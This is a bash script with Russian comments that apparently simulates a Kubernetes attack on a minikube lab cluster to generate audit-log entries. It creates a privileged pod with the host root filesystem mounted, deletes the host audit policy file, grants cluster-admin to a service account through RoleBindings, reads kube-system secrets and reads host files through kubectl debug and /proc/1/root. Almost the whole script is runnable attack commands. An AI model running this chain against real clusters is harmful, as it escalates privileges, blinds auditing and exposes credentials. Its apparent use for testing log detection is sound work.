#!/bin/bash
echo "Начало: $(date)"
echo Создаём привилегированный под [ДОЛЖНО ПОПАСТЬ В ЛОГИ]

cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: debug
    image: nicolaka/netshoot
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
    - name: host-proc
      mountPath: /host-proc
    - name: host-sys
      mountPath: /host-sys
  volumes:
  - name: host-root
    hostPath:
      path: /
  - name: host-proc
    hostPath:
      path: /proc
  - name: host-sys
    hostPath:
      path: /sys
  restartPolicy: Never
EOF

kubectl wait --for=condition=Ready pod/privileged-pod --timeout=300s

echo Просматриваем текущие политики безопасности [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl exec -it privileged-pod -- cat /host/etc/ssl/certs/audit-policy.yaml
echo Удаляем политики безопасности, в 1-й раз должно вывестись REMOVED [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl exec -it privileged-pod -- rm /host/etc/ssl/certs/audit-policy.yaml && echo REMOVED
echo "Во 2-й раз будет отказ в доступе, это проверка, что файл точно удалён [ДОЛЖНО ПОПАСТЬ В ЛОГИ]"
kubectl exec -it privileged-pod -- rm /host/etc/ssl/certs/audit-policy.yaml && echo REMOVED

# Хинт: логи после этого не должны перестать записываться в прежнем режиме даже после перезагрузки minikube (по крайней мере, audit-policy.yaml после пересоздания minikube там появилось снова)


echo Создание namespace [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl create ns secure-ops
kubectl config set-context --current --namespace=secure-ops

echo Создание service account [ДОЛЖНО ПОПАТСЬ В ЛОГИ]
kubectl create sa monitoring
echo "Создание пода с указанным SA [ДОЛЖНО ПОПАСТЬ В ЛОГИ]"
kubectl run sooper-dooper-attacker-pod-from-hell --image=alpine --serviceaccount=monitoring --command -- sleep 3600

echo can-i get secrets --as=system:serviceaccount:secure-ops:monitoring [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

echo Добавляем SA monitoring права на системное пространство [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: kube-system
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

echo Добавляем SA monitoring права на пространство secure-ops [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: escalate-binding-kube-system
  namespace: kube-system
subjects:
- kind: ServiceAccount
  name: monitoring
  namespace: secure-ops
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

echo can-i get secrets --as=system:serviceaccount:secure-ops:monitoring [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl auth can-i get secrets --as=system:serviceaccount:secure-ops:monitoring

echo Читаем секреты из-под админа [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}') --as=system:serviceaccount:secure-ops:monitoring
echo Читаем секреты из-под SA monitoring [ДОЛЖНО ПОПАСТЬ В ЛОГИ]
kubectl get secret -n kube-system $(kubectl get secrets -n kube-system | grep default-token | head -n1 | awk '{print $1}')

echo "Читаем что-то на minikube host (точнее, в docker-контейнере minikube) [ДОЛЖНО ПОПАСТЬ В ЛОГИ]"
kubectl debug -n kube-system pod/storage-provisioner \
  --image=nicolaka/netshoot \
  --target=storage-provisioner -it -- cat /proc/1/root/etc/hosts

echo "Читаем ещё что-то на minikube host (точнее, в docker-контейнере minikube) [ДОЛЖНО ПОПАСТЬ В ЛОГИ]"
kubectl debug -n kube-system pod/storage-provisioner \
  --image=nicolaka/netshoot \
  --target=storage-provisioner -it -- cat /proc/1/root/etc/resolv.conf

echo "Конец: $(date)"